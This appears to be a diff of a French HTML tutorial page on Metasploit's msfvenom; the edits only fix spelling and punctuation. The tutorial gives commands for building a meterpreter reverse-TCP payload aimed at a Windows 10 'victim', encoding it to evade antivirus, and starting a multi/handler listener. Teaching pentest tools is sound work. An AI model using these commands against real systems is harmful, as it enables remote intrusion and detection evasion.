@@ -1,7 +1,7 @@
 <h2 class="mb-3">1. Découverte</h2>
 <p>
     Bienvenue dans ce nouveau tutoriel consacré à l'outil Venom présent dans le framework Metasploit.
-    Dans ce tutoriel nous nous concentrerons sur les fonctionnalités liées à la génération d'un payload avec
+    Dans ce tutoriel, nous nous concentrerons sur les fonctionnalités liées à la génération d'un payload avec
     msfVenom.
     MsfVenom est un outil qui regroupe dans une seule instance les deux outils suivants : MsfPayload et MsfEncode
     rendant ainsi la génération et l'encodage de payload beaucoup plus efficace.
@@ -17,8 +17,8 @@
 
 <h2 class="mb-3">3. Installation</h2>
 <p>
-    MetaSploit est fourni de base avec les distributions linux orientées pentest (Kali, Parrot).
-    Cependant si vous disposez d’une distribution plus « classique » ou bien si vous êtes sous Windows alors il vous
+    MetaSploit est fourni de base avec les distributions Linux orientées pentest (Kali, Parrot).
+    Cependant, si vous disposez d’une distribution plus « classique » ou bien si vous êtes sous Windows, alors il vous
     faudra vous rendre sur ce site et suivre la procédure d’installation qui y est décrite : <a
         href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html"><u>Installation</u></a>
 </p>
@@ -28,8 +28,8 @@
 <h3>Génération du Payload avec MsfVenom</h3>
 <p>
     Pour générer un payload nous aurons besoin d'une seule ligne de commande. Il faut donc réfléchir avant au
-    payload que l'on souhaite mettre en oeuvre.
-    Pour ce tutoriel nous allons essayer de générer un payload qui va initier une connexion type reverse tcp.
+    payload que l'on souhaite mettre en œuvre.
+    Pour ce tutoriel, nous allons essayer de générer un payload qui va initier une connexion type reverse TCP.
     On prendra comme cible une machine tournant sous windows 10.
     Ouvrez un terminal dans votre système d’exploitation d'attaque et tapez la commande suivante :
     <br />
@@ -39,10 +39,10 @@
     <br />
     Tapez puis validez : <kbd class="ms-3">msfvenom -l encoders</kbd>
     <br />
-    Cette commande vous permet de lister tout les encodeurs disponibles. Nous reviendrons un peu plus tard sur
+    Cette commande vous permet de lister tous les encodeurs disponibles. Nous reviendrons un peu plus tard sur
     l'utilité d'utiliser un encodeur.
     <br />
-    Pour ce tutoriel nous allons essayer de générer dans un premier temps un payload en python capable d'initier une
+    Pour ce tutoriel, nous allons essayer de générer dans un premier temps un payload en python capable d'initier une
     connexion de type reverse shell sur l'ordinateur de la victime et ouvrir une session meterpreter.
     <br />
     Tapez puis validez : <kbd class="ms-3">msfvenom -p windows/meterpreter/reverse_tcp lhost=[votre ip] lport=[votre
@@ -50,11 +50,11 @@
 </p>
 <img src="Tutoriel/tuto-msfvenom/images/1.png" style="width: 100%;" />
 <p>
-    Une fois votre payload généré, il vous faudra l'envoyer à votre victime par le moyen de votre choix. Cependant
-    le payload que nous venons de générer est <span style="font-weight: bold;">brute</span>, c'est à dire qu'il
+    Une fois votre payload généré, il vous faudra l'envoyer à votre victime par le moyen de votre choix. Cependant,
+    le payload que nous venons de générer est <span style="font-weight: bold;">brute</span>, c'est-à-dire qu'il
     n'est pas encodé et sera donc facilement détecté.
     <br />
-    C'est là qu'msfvenom peut s'avérer utile car il vous permet, en ajoutant un flag lors de la génération du
+    C'est là que msfvenom peut s'avérer utile, car il vous permet, en ajoutant un flag lors de la génération du
     payload, de l'encoder en spécifiant l'encodeur de votre choix.
     <br />
     Plusieurs encodeurs sont disponibles et chacun d'eux est noté par sa capacité à encoder les payloads afin qu'ils
@@ -67,7 +67,7 @@
 <img src="Tutoriel/tuto-msfvenom/images/2.png" style="width: 100%;" />
 <p>
     Pour encoder votre payload il vous suffit de rajouter à la commande précédente le flag "-e [encodeur à
-    utiliser]" et vous pouvez même spécifiez le nombre d'itérations d'encodage à réaliser pour le rendre encore plus
+    utiliser]" et vous pouvez même spécifier le nombre d'itérations d'encodage à réaliser pour le rendre encore plus
     indétectable avec le flag "-i [nombre d'itérations]"
     <br />
     Pour notre exemple, la commande finale serait donc :
@@ -81,19 +81,19 @@
     Il faut maintenant paramétrer MetaSploit pour qu’il se mette en attente d’une connexion entrante provenant de la
     machine infectée.
     <br />
-    A la suite dans le précédent terminal tapez puis validez : <kbd class="ms-3">use exploit/multi/handler </kbd>
+    A la suite dans le précédent terminal, tapez puis validez : <kbd class="ms-3">use exploit/multi/handler </kbd>
     <br />
-    Tapez puis validez : <kbd class="ms-3">set lhost [Votre adresse IP] </kbd>
+    Tapez ensuite validez : <kbd class="ms-3">set lhost [Votre adresse IP] </kbd>
     <br />
     Cette commande vous permet de voir les différents paramètres à configurer pour utiliser le module.
     <br />
-    Tapez puis validez : <kbd class="ms-3">set payload windows/meterpreter/reverse_tcp </kbd>
+    Tapez ensuite validez : <kbd class="ms-3">set payload windows/meterpreter/reverse_tcp </kbd>
     <br />
-    Tapez puis validez : <kbd class="ms-3">exploit</kbd>
+    Tapez ensuite validez : <kbd class="ms-3">exploit</kbd>
 </p>
 <img src="Tutoriel/tuto-msfvenom/images/5.png" style="width: 100%;" />
 <p>
-    A présent il faut laisser ce terminal ouvert et attendre l'activation du payload.
+    À présent, il faut laisser ce terminal ouvert et attendre l'activation du payload.
 </p>
 
 <h3>Msfvenom Vs Antivirus</h3>
@@ -107,5 +107,5 @@
     page : <a href="cours.php?cours=26"><u>Présentation sur les antivirus</u></a>
     <br />
     Aussi, dans la plupart des cas, utiliser msfvenom pour générer un payload ne sera plus suffisant pour ne pas
-    être détecter.
+    être détecté.
 </p>
